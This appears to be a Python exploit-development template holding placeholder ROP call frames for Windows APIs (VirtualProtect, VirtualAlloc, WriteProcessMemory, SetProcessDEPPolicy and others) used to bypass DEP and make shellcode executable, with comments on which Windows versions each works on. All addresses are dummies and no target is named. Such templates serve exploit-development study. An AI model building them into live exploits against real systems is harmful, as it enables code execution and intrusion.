#!/usr/bin/env python3
from struct import pack as _pack


def p32(val):
    return _pack("<L", val)


# -----------------------------------------------------------------------
# VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
# WORKS ON: All Windows versions with DEP OptIn/OptOut/AlwaysOn
# NOTE: Uses PUSHAD technique - set all regs then PUSHAD builds call frame
# -----------------------------------------------------------------------
def rop_virtualprotect():
    vp = p32(0x45454545)  # dummy VirtualProtect Address (API ADDRESS)
    vp += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    vp += p32(0x47474747)  # Shellcode Return Address (RETURN ADDRESS)
    vp += p32(0x48484848)  # dummy dwSize set to 0x00000001 for RWX
    vp += p32(0x49494949)  # dummy flNewProtect set to 0x40 (PAGE_EXECUTE_READWRITE)
    vp += p32(
        0x51515151
    )  # dummy lpflOldProtect set to NULL or address of writable memory for output
    return vp


# -----------------------------------------------------------------------
# VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
# WORKS ON: All Windows versions with DEP OptIn/OptOut/AlwaysOn
# NOTE: Returns new RWX region in EAX - must copy shellgen there then JMP EAX
# -----------------------------------------------------------------------
def rop_virtualalloc():
    va = p32(0x45454545)  # dummy VirtualAlloc Address (API ADDRESS)
    va += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    va += p32(0x47474747)  # Shellcode Return Address (RETURN ADDRESS)
    va += p32(0x48484848)  # dummy dwSize set to 0x00000001 for RWX (make it 0x201)
    va += p32(0x49494949)  # dummy flAllocationType set to 0x1000 (MEM_COMMIT)
    va += p32(0x51515151)  # dummy flProtect set to 0x40 (PAGE_EXECUTE_READWRITE)
    return va


# -----------------------------------------------------------------------
# WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)
# WORKS ON: All Windows versions with DEP OptIn/OptOut/AlwaysOn
# NOTE: Copies shellgen into an existing executable section (code cave)
# usually uses code caves
# -----------------------------------------------------------------------
def rop_writeprocessmemory():
    wpm = p32(0x45454545)  # dummy WriteProcessMemory Address (API ADDRESS)
    wpm += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    wpm += p32(
        0x47474747
    )  # dummy hProcess use pseudo handle 0xFFFFFFFF for current process
    wpm += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    wpm += p32(
        0x49494949
    )  # dummy lpBuffer use address of shellgen on stack or in .data section
    wpm += p32(0x51515151)  # dummy nSize set to size of shellgen
    wpm += p32(
        0x52525252
    )  # dummy lpBytesWritten set to NULL or address of writable memory for output
    return wpm


# -----------------------------------------------------------------------
# HeapCreate(flOptions, dwInitialSize, dwMaximumSize)
# WORKS ON: XP SP3, Vista SP1, Server 2008 (OptIn/OptOut only, NOT AlwaysOn)
# NOTE: Creates executable heap - returns handle in EAX
# -----------------------------------------------------------------------
def rop_heapcreate():
    hc = p32(0x45454545)  # dummy HeapCreate Address (API ADDRESS)
    hc += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    hc += p32(0x47474747)  # dummy flOptions
    hc += p32(0x48484848)  # dummy dwInitialSize
    hc += p32(0x49494949)  # dummy dwMaximumSize
    return hc


# -----------------------------------------------------------------------
# HeapAlloc(hHeap, dwFlags, dwBytes)
# WORKS ON: XP SP3, Vista SP1, Server 2008 (OptIn/OptOut only, NOT AlwaysOn)
# NOTE: Allocates memory from heap - use with HeapCreate for executable heap
# -----------------------------------------------------------------------
def rop_heapalloc():
    ha = p32(0x45454545)  # dummy HeapAlloc Address (API ADDRESS)
    ha += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    ha += p32(0x47474747)  # dummy hHeap
    ha += p32(0x48484848)  # dummy dwFlags
    ha += p32(0x49494949)  # dummy dwBytes
    return ha


# -----------------------------------------------------------------------
# SetProcessDEPPolicy(dwFlags)
# WORKS ON: XP SP3, Vista SP1, Server 2008 - ONLY OptIn or OptOut DEP mode
# FAILS ON: AlwaysOn, /NXCOMPAT linked binaries, if already called once in process
# NOTE: Disables DEP for entire process - shellgen runs on stack directly after
# -----------------------------------------------------------------------
def rop_setprocessdeppolicy():
    dep = p32(0x45454545)  # dummy SetProcessDEPPolicy Address (API ADDRESS)
    dep += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    dep += p32(0x47474747)  # dummy dwFlags
    return dep


# -----------------------------------------------------------------------
# NtSetInformationProcess(ProcessHandle, ProcessInformationClass,
#                          ProcessInformation, ProcessInformationLength)
# WORKS ON: XP SP3, Vista (pre-/NXCOMPAT) - ONLY OptIn or OptOut DEP mode
# FAILS ON: AlwaysOn, executables linked with /NXCOMPAT (Vista+), Permanent DEP flag
# NOTE: Disables DEP at process level via ntdll - shellgen runs on stack after
# -----------------------------------------------------------------------
def rop_ntsetinformationprocess():
    nsi = p32(0x45454545)  # dummy NtSetInformationProcess Address (API ADDRESS)
    nsi += p32(0x46464646)  # Shellcode Return Address (RETURN ADDRESS)
    nsi += p32(0x47474747)  # dummy ProcessHandle
    nsi += p32(0x48484848)  # dummy ProcessInformationClass
    nsi += p32(0x49494949)  # dummy ProcessInformation
    nsi += p32(0x51515151)  # dummy ProcessInformationLength
    return nsi
